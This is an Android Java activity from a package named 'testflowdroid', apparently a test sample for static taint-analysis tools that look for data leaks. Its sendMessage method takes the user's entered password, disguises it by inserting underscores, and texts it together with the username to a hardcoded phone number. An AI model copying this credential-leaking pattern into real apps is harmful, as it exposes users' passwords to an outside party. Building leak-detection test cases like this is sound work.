package com.example.testflowdroid;

import android.app.Activity;
//import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.EditText;

public class MainActivity extends Activity {
    private User user = null;
    @Override
    protected void onRestart(){
        super.onRestart();
        EditText usernameText =
                (EditText)findViewById(R.id.username);
        EditText passwordText =
                (EditText)findViewById(R.id.pwdString);
        String uname = usernameText.toString();
        String pwd = passwordText.toString();
        if(!uname.isEmpty() && !pwd.isEmpty())
            this.user = new User(uname, pwd);
    }
    //Callback method in xml file
    public void sendMessage(View view){
        if(user == null) return;
        Password pwd = user.getPwd();
        String pwdString = pwd.getPassword();
        String obfPwd = "";
        //must track primitives
        for(char c : pwdString.toCharArray())
            obfPwd += c + "_";
        String message = "User: " +
                user.getUsername() + " | PWD: " + obfPwd;
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+44 020 7321 0905",
                null, message, null, null);
    }

        @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }
}